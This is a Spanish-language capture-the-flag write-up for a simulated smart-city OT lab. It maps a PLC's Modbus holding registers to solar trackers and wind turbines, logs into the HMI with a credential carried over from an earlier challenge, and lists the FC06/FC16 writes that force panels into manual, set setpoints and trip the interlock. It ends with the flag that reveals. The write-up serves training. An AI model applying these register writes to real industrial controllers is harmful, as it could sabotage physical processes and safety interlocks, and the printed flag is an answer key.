# Protección en Estado Crítico 4/5 — Manipulación de registros PLC

> Curso: CyberGames_AIEP · Categoría: TI/OT Maqueta Smartcity CUADRANTE 1 · Valor: 600

## Objetivo

Nos piden relacionar los registros del controlador (PLC **172.16.0.25**) con los elementos de generación (aerogeneradores y seguidores solares) y **provocar la condición anómala** que activa el mecanismo de protección simulado. La consola de supervisión es la **HMI 10.10.10.30**, donde nos logueamos con la credencial `f3lip3.operador` del desafío anterior.

## Reconocimiento de la consola

1. La HMI tiene un portal de login. Entramos y llegamos a `/centro/` (tablero de energía). La página consulta una API en vivo:
   ```
   GET /centro/api/status   ->   { panels:[...], turbines:[...], led, alarm, phase }
   ```
   El estado normal: `phase=normal`, `led=true` (protección habilitada). La condición de victoria es **`phase=victory`** ("PATRÓN ENERGÉTICO COMPLETADO").
   ![](../_attachments/)

## Mapa de registros (Modbus)

Relacionando el status de la HMI con los holding registers del PLC armamos el mapa:

| Registro | Función |
|----------|---------|
| HR16–19 | Selector de **modo** de cada panel (1 = manual) |
| HR20/22/24/26 | **Setpoints** de orientación de los paneles |
| HR21/23/25/27 | Ángulos **reales** (feedback físico) |
| HR10/12/14 | **Velocidades** de las turbinas |
| HR11..15 | Interlock / enclavamiento |

## Explotación (secuencia que dispara la protección)

2. Ponemos los 4 paneles en **modo manual** (como los equipos "legacy" solo obedecen si no están en auto):
   ```
   FC06  HR16=1  HR17=1  HR18=1  HR19=1
   ```

3. Escribimos los **setpoints** en patrón alternado alto/bajo:
   ```
   FC06  HR20=125  HR22=29  HR24=125  HR26=29
   ```

4. Dejamos las **velocidades de turbina** en 200:
   ```
   FC06  HR10=200  HR12=200  HR14=200
   ```

5. Esperamos a que la **física del simulador** lleve los ángulos reales al patrón (HR21≥120, HR23≤30, HR25≥120, HR27≤30).

6. Disparamos el **interlock** con un write múltiple:
   ```
   FC16  addr 11  valores [1, 200, 1, 200, 1]
   ```
   Esto rompe la condición de seguridad y el sistema entra en **failsafe → victory**. La HMI muestra "ALERTA CRÍTICA".
   ![](../_attachments/)

## Obtención de la flag

7. Al entrar en estado crítico, el PLC escribe la flag en ASCII dentro de los registros **HR30 a HR50**. La leemos con un `Read Holding Registers` (FC 0x03) y decodificamos cada valor como carácter:
   ```python
   regs = read(30, 21)
   flag = "".join(chr(v) for v in regs)   # 99,105,98,101,114,108,97,98,123,...
   ```

**FLAG: `ciberlab{plc_r3g_pwn}`**

## Conclusión

Entendiendo qué holding register representa cada elemento físico (modos, setpoints, velocidades e interlock), pudimos **forzar una condición anómala coordinada** que el sistema de protección interpreta como crítica. Modbus no valida quién escribe, así que con los writes correctos manipulamos el proceso completo. Finalizamos.
